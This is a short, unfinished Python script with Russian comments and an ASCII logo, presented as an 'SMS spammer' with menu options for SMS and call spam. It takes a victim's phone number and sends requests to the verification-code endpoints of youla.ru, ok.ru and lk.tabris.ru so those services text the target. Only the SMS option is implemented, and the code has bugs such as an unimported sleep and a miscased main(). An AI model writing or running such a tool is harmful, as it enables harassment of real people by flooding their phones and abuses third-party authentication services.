#Не Забудь его доработать
import requests
import time
#СМС СПАММЕР
def Soobsh():
    phone = str(input('Введите номер телефона: '))
    try:
       requests.post("https://youla.ru/web-api/auth/request_code", data={"phone":phone})
       print("Сообщение ЮЛА пошло")
    except:
       print("Сообщение ЮЛА не пошло")
       pass
    try:
	    requests.post("https://ok.ru/web-api/auth/request_code", data={"phone":phone})
	    print("Сообщение Дноклассники пошло")
    except:
        print("Сообщение Одноклассники не пошло")
        pass
    try:
        requests.post("https://lk.tabris.ru/register/", data={"phone":phone})
        print("Пошла фигня")
    except:
        print("Сообщение фигня и не пошло")
        pass

#Логотип
def Logo():
 print(r"░██████╗██████╗░░█████╗░███╗░░░███╗███╗░░░███╗███████╗██████╗░███╗░░██╗██╗░░░██╗███╗░░░███╗░░███╗░░")
 print(r"██╔════╝██╔══██╗██╔══██╗████╗░████║████╗░████║██╔════╝██╔══██╗████╗░██║██║░░░██║████╗░████║░████║░░")
 print(r"╚█████╗░██████╔╝███████║██╔████╔██║██╔████╔██║█████╗░░██████╔╝██╔██╗██║██║░░░██║██╔████╔██║██╔██║░░")
 print(r"░╚═══██╗██╔═══╝░██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝░░██╔══██╗██║╚████║██║░░░██║██║╚██╔╝██║╚═╝██║░░")
 print(r"██████╔╝██║░░░░░██║░░██║██║░╚═╝░██║██║░╚═╝░██║███████╗██║░░██║██║░╚███║╚██████╔╝██║░╚═╝░██║███████╗")


#Основное меню
def Main():
 Logo()
 print("1. СМС СПАММЕР")
 print("2. СПАММ ЗВОНКАМИ")
 print("3. СПАМ ЗВОНКАМИ И СМС (Mix)")
 print("4. ВЫХОД")
 choice = input("Введите номер:")
 if choice == "4":
    print("До связи")
    exit()
 elif choice == "1":
     Soobsh()
 else:
    print("Номер введен неверно!")
    sleep(1)
    main()





Main()
